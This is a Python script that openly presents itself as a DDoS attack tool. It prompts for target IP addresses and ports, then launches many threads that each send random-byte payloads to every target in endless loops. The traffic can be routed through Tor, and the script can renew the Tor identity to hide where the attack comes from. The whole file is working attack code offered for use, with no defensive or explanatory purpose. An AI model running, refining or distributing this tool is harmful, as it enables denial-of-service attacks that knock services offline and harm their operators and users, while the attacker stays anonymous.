import os
import time
import socket
import threading
import logging
import subprocess
import socks  # PySocks library for SOCKS proxy
from stem import Signal
from stem.control import Controller

# DDOS-Attack [ASCII Art]
def display_banner():
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
    print(banner)

display_banner()

# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Set up logging
logging.basicConfig(filename='ddos_attack.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to start Tor service in the background
def start_tor_service():
    try:
        subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Tor service started in the background.")
    except Exception as e:
        print(f"Failed to start Tor service: {e}")
        exit(1)

# Function to renew Tor identity (change exit node)
def renew_tor_identity():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            print("Tor identity renewed.")
    except Exception as e:
        print(f"Failed to renew Tor identity: {e}")

# Function to send packets via Tor
def send_packets_via_tor(ip, port, data, rate_limit):
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

    sock = None  # Initialize sock as None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        while True:
            sock.send(data)
            print(f"[Tor] Sent {len(data)} bytes to {ip}:{port}")
            time.sleep(rate_limit)
    except Exception as e:
        logging.error(f"Error sending packet to {ip}:{port} via Tor: {e}")
    finally:
        if sock:  # Check if sock was successfully initialized
            sock.close()

# Function to send packets directly (without Tor)
def send_packets_direct(ip, port, data, rate_limit):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        while True:
            sock.send(data)
            print(f"[Direct] Sent {len(data)} bytes to {ip}:{port}")
            time.sleep(rate_limit)
    except Exception as e:
        logging.error(f"Error sending packet to {ip}:{port} directly: {e}")
    finally:
        if sock:
            sock.close()

# Main script
if __name__ == "__main__":
    ips = input("IP Targets (separated by commas): ").split(',')
    
    # Default values if user doesn't provide inputs
    ports_input = input("Ports (separated by commas, leave blank for default): ")
    ports = list(map(int, ports_input.split(','))) if ports_input else [80, 443]
    
    rate_limit_input = input("Rate Limit (seconds between packets, leave blank for default): ")
    rate_limit = float(rate_limit_input) if rate_limit_input else 0.1
    
    user_agent = "Mozilla/5.0"  # Default value, removed from user prompt as per requirement
    
    data_size_input = input("Data Size (bytes, leave blank for default): ")
    data_size = int(data_size_input) if data_size_input else 600
    
    threads_input = input("Number of threads (leave blank for default): ")
    threads = int(threads_input) if threads_input else 20
    
    use_tor_input = input("Send packets via Tor? (y/n, leave blank for default 'y'): ").lower()
    use_tor = use_tor_input == 'y' if use_tor_input else True

    # Prepare data payload
    data = os.urandom(data_size)

    # Start Tor service if selected
    if use_tor:
        start_tor_service()
        time.sleep(5)  # Wait for Tor to initialize

    print("Thank you for using the KARTHIK-LAL (DDOS-ATTACK-TOOL).")

    time.sleep(3)
    for ip in ips:
        for port in ports:
            print(f"Starting the attack on {ip} at port {port}...")
            for _ in range(threads):
                if use_tor:
                    t = threading.Thread(target=send_packets_via_tor, args=(ip, port, data, rate_limit))
                else:
                    t = threading.Thread(target=send_packets_direct, args=(ip, port, data, rate_limit))
                t.start()

    # Clean the terminal
    if os.name == "nt":  # Windows
        os.system("cls")
    else:  # Linux or Mac
        os.system("clear")

    input("Press Enter to exit...")
